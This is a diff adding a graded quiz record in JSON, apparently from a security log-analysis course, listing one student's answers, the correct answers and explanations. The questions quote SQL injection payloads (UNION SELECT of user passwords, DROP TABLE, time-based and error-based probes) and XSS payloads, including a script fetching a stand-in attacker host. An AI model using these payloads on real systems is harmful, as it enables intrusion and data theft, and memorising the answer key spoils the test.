@@ -1,0 +1,66 @@
+{
+    "student_name": "Bilo_rani",
+    "score": 3,
+    "answers": [
+        {
+            "question": "What type of SQL Injection attack is indicated by `GET /login.php?user=admin'+OR+'1'='1` in Log-01?",
+            "student_answer": "B: Time-based",
+            "correct_answer": "A",
+            "explanation": "Log-01 explicitly states this is a 'SQL Injection - Boolean -based test' using a boolean condition (OR 1=1) to bypass authentication."
+        },
+        {
+            "question": "The presence of \"sqlmap/1.7\" in the User-Agent string, as seen in Log-03, typically indicates what type of activity?",
+            "student_answer": "B: Automated SQL injection",
+            "correct_answer": "B",
+            "explanation": "Log-03 identifies the 'Attack Type' as 'SQL Injection (Automated with sqlmap)' and explains it as an 'Automated SQL injection attempt using sqlmap'."
+        },
+        {
+            "question": "What is the primary goal of the attack indicated by `GET /product?id= -1%20UNION%20SELECT%20username,password%20FROM%20users` in Log-06?",
+            "student_answer": "B: Delete database tables",
+            "correct_answer": "C",
+            "explanation": "Log-06 clearly states the 'Goal' of this specific attack is to 'Exfiltrate data from the users' table'."
+        },
+        {
+            "question": "An attacker sending `GET /user?id=1;DROP TABLE users; --` (Log-08) has what malicious goal?",
+            "student_answer": "B: Delete or damage the database structure",
+            "correct_answer": "B",
+            "explanation": "Log-08 explains this as an 'SQL injection attempting to execute a DROP TABLE query to delete the users table' with the 'Goal: Delete or damage the database structure'."
+        },
+        {
+            "question": "The XSS payload `<script>alert(document.cookie)</script>` in `GET /profile?bio=` (Log-11) is specifically designed for what purpose?",
+            "student_answer": "B: Stealing session cookies",
+            "correct_answer": "B",
+            "explanation": "Log-11 categorizes this as 'XSS (Cookie theft)' and states its 'Goal: Steal session cookies or other sensitive information'."
+        },
+        {
+            "question": "What characteristic defines the SQL Injection attack using `SLEEP(5)` as seen in `GET /item?id=1%20OR%20SLEEP(5)` (Log-19)?",
+            "student_answer": "B: It attempts to bypass authentication using boolean logic",
+            "correct_answer": "C",
+            "explanation": "Log-19 specifies this as 'SQL Injection (Time -based Blind)' and explains it's used to 'check if the SQL query is vulnerable by delaying the response'."
+        },
+        {
+            "question": "What type of SQL Injection attack is indicated by `EXTRACTVALUE(0,concat(0x7e,(SELECT%20user())))` (Log-17) and what is its specific goal?",
+            "student_answer": "B: Boolean-based SQLi to check conditions",
+            "correct_answer": "C",
+            "explanation": "Log-17 identifies this as 'SQL Injection (Error -based)' with the 'Goal: Extract sensitive data like the current user from the database' using EXTRACTVALUE."
+        },
+        {
+            "question": "The XSS attack in `GET /search?q=<script>fetch('http://evil.com')</script>` (Log-24) is assigned a 'Critical' risk because its goal is to:",
+            "student_answer": "B: Delete database entries",
+            "correct_answer": "C",
+            "explanation": "Log-24 states the 'Goal' is to 'Test for XSS vulnerability that exfiltrates data to an attacker -controlled server', leading to the 'Critical' risk of stealing sensitive data."
+        },
+        {
+            "question": "What is the specific goal of the attack shown in Log-25, `GET /admin/users?id= -1%20UNION%20SELECT%20password,username%20FROM%20admins`?",
+            "student_answer": "B: To inject a malicious script into the admin panel",
+            "correct_answer": "C",
+            "explanation": "Log-25 explicitly states the 'Explanation: A UNION SELECT query targeting the admins table to extract admin usernames and passwords' and the 'Goal: Extract administrative data from the database'."
+        },
+        {
+            "question": "In Log-02, the indicator `GET /search?q=<script>alert('XSS1') </script>` suggests which type of attack and XSS variant?",
+            "student_answer": "B: XSS, Stored",
+            "correct_answer": "C",
+            "explanation": "Log-02 directly identifies the 'Attack Type' as 'XSS (Reflective)' and explains it as a 'Reflective XSS payload injected into the q query parameter'."
+        }
+    ]
+}
